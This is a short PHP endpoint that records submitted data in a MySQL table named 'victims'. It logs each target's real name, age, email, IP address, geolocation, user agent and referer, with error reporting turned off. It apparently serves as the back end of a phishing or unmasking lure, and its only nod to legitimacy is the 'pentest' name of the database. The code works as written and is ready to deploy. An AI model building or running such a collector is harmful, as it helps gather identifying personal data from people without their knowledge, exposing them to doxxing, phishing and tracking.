<?php
header('Content-Type: application/json');
error_reporting(0);

// MySQL config - UPDATE THESE
$host = 'localhost';
$dbname = 'pentest_db';
$username = 'pentest_user';
$password = 'your_secure_password';

try {
    $pdo = new PDO("mysql:host=$host;dbname=$dbname", $username, $password);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch(PDOException $e) {
    die(json_encode(['error' => 'DB connection failed']));
}

$input = json_decode(file_get_contents('php://input'), true);
$data = $_POST;

if (!$input && !$data) {
    http_response_code(400);
    die(json_encode(['error' => 'No data']));
}

// Merge input data
$record = array_merge($input ?: $data, [
    'remote_ip' => $_SERVER['REMOTE_ADDR'],
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
    'referer' => $_SERVER['HTTP_REFERER'] ?? '',
    'timestamp' => date('Y-m-d H:i:s')
]);

// Insert into database
$stmt = $pdo->prepare("
    INSERT INTO victims (type, real_name, age, reason, email, ip, geo, user_agent, remote_ip, referer, timestamp) 
    VALUES (:type, :real_name, :age, :reason, :email, :ip, :geo, :user_agent, :remote_ip, :referer, :timestamp)
");

$stmt->execute([
    'type' => $record['type'] ?? 'unknown',
    'real_name' => $record['realName'] ?? $record['real_name'] ?? '',
    'age' => $record['age'] ?? '',
    'reason' => $record['reason'] ?? '',
    'email' => $record['email'] ?? '',
    'ip' => $record['ip'] ?? '',
    'geo' => $record['geo'] ?? '',
    'user_agent' => $record['user_agent'] ?? '',
    'remote_ip' => $record['remote_ip'],
    'referer' => $record['referer'],
    'timestamp' => $record['timestamp']
]);

echo json_encode(['status' => 'success', 'id' => $pdo->lastInsertId()]);
?>
